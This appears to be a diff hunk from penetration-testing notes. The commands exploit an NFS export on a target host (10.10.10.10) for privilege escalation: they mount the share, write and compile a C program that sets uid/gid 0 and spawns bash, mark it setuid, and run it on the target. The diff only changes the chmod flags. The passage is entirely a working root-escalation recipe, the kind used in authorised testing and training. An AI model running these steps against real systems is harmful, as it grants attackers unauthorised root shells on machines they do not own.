@@ -362,7 +362,7 @@ mkdir /tmp/nfs # our kali
 mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs # our kali
 echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/nfs/shell.c # our kali
 gcc /tmp/nfs/shell.c -o /tmp/nfs/shell # our kali 
-chmod +s /tmp/nfs/shell # our kali OR target machine
+chmod +xs /tmp/nfs/shell # our kali OR target machine
 /tmp/shell # target machine
 ```
 
